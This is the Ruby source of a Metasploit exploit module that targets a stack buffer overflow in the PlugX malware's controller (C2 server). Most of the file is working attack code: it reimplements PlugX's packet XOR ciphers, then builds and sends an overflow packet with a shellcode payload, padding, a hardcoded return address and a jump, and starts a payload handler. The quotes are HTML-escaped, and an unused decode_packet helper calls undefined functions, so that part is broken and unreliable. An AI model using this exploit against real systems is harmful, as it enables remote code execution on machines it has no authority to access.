# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;zlib&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;PlugX Controller Stack Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a Stack buffer overflow in the PlugX Controller (C2 server)
      },
      &#039;Author&#039;         => &#039;Professor Plum&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;AllowWin32SEH&#039; => true
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 0xe000,
          &#039;BadChars&#039; => &#039;&#039;,
          &#039;EncoderType&#039; => Msf::Encoder::Type::AlphanumMixed
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;DisclosureDate&#039; => &#039;Jul 27 2017&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;PlugX Type I (old)&#039;, { &#039;xor&#039; => 0, &#039;callebp&#039; => 0x004045c4 }],
          [&#039;PlugX Type I&#039;,         { &#039;xor&#039; => 1, &#039;callebp&#039; => 0x004045c4 }],
          [&#039;PlugX Type II&#039;,        { &#039;xor&#039; => 2, &#039;callebp&#039; => 0x004045c4 }]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultTarget&#039; => 2)
    )

    register_options(
      [
        Opt::RPORT(13579)
      ]
    )
  end

  def xor_stream1(key, src)
    key0 = key1 = key2 = key3 = key
    dst = &#039;&#039;
    for i in 0..(src.size - 1)
      key0 = (key0 + (key0 >> 3) - 0x11111111) & 0xFFFFFFFF
      key1 = (key1 + (key1 >> 5) - 0x22222222) & 0xFFFFFFFF
      key2 = (key2 + 0x44444444 - (key2 << 9)) & 0xFFFFFFFF
      key3 = (key3 + 0x33333333 - (key3 << 7)) & 0xFFFFFFFF
      new_key = (key2 + key3 + key1 + key0) & 0xFF
      res = src[i].ord ^ new_key
      dst += res.chr
    end
    dst
  end

  def xor_stream1a(key, src)
    key0 = key1 = key2 = key3 = key
    dst = &#039;&#039;
    for i in 0..(src.size - 1)
      key0 = (key0 + (key0 >> 3) + 3) & 0xFFFFFFFF
      key1 = (key1 + (key1 >> 5) + 5) & 0xFFFFFFFF
      key2 = (key2 - 7 - (key2 << 9)) & 0xFFFFFFFF
      key3 = (key3 - 9 - (key3 << 7)) & 0xFFFFFFFF
      new_key = (key2 + key3 + key1 + key0) & 0xFF
      res = src[i].ord ^ new_key
      dst += res.chr
    end
    dst
  end

  def xor_stream2(key, data)
    dst = &#039;&#039;
    for i in 0..(data.size - 1)
      key = (((key << 7) & 0xFFFFFFFF) - ((key >> 3) & 0xFFFFFFFF) + i + 0x713A8FC1) & 0xFFFFFFFF
      dst += ((key & 0xFF) ^ ((key >> 8) & 0xFF) ^ ((key >> 16) & 0xFF) ^ data[i].ord ^ ((key >> 24) & 0xFF)).chr
    end
    dst
  end

  def xor_wrap(key, data)
    if target[&#039;xor&#039;] == 0
      return xor_stream1a(key, data)
    elsif target[&#039;xor&#039;] == 1
      return xor_stream1(key, data)
    elsif target[&#039;xor&#039;] == 2
      return xor_stream2(key, data)
    end
    print_status(&#039;Unknown PlugX Type&#039;)
  end

  def validate_response(data)
    if data.nil?
      print_status(&#039;Server closed connection&#039;)
      return false
    end
    if data.empty?
      print_status(&#039;No response recieved&#039;)
      return false
    end
    if data.size < 16
      print_status(&#039;Invalid packet&#039;)
      print_status(data.inspect)
      return false
    end
    key = data[0..4].unpack(&#039;<I&#039;)[0]
    hdr = xor_wrap(key, data[0..16])
    _x, _flags, _cmd, comp_size, _uncomp_size, _xx = hdr.unpack(&#039;<ISSSSI&#039;)
    if (comp_size + 16) == data.size
      raw = xor_wrap(key, data[16..-1])
      print_status(raw.inspect)
      return true
    end
    false
  end

  def check
    connect
    key = rand(0xFFFFFFFF)
    hh = [key, 0, 0, 0, 0, 0].pack(&#039;<ISSSSI&#039;)
    hdr = xor_wrap(key, hh)
    sock.put([key].pack(&#039;<I&#039;) + hdr[4..-1])
    if validate_response(sock.get_once || &#039;&#039;)
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end

  def decode_packet(data)
    key = data[0..4].unpack(&#039;<I&#039;)
    _x, flags, _cmd, _comp_size, _uncomp_size, _xx = xorstream2(key, data[0..16]).unpack(&#039;<ISSSSI&#039;)

    buf = xor_stream(key, data[16..-1])
    return the_flags[flags & 0xffff], xx, buf
  end

  def exploit
    print_status("Trying target #{target.name}...")

    l = 0xF008
    pad = 0x18
    a = 0x004045c4
    pktlen = l + pad + 9
    jmp = "\xe9" + [-pktlen].pack(&#039;<I&#039;)
    key = rand(0xFFFFFFFF)
    hh = [key, 0, 0, pktlen, pktlen, 0].pack(&#039;<ISSSSI&#039;)
    hdr = xor_wrap(key, hh)
    pkt = [key].pack(&#039;<I&#039;) + hdr[4..-1] + payload.encoded + &#039;A&#039; * (l - payload.encoded.size) + [a].pack(&#039;<I&#039;) + &#039;x&#039; * pad + jmp

    connect
    sock.put(pkt)

    print_status(&#039;Waiting for response&#039;)
    validate_response(sock.get_once)
    disconnect

    handler
  end
end

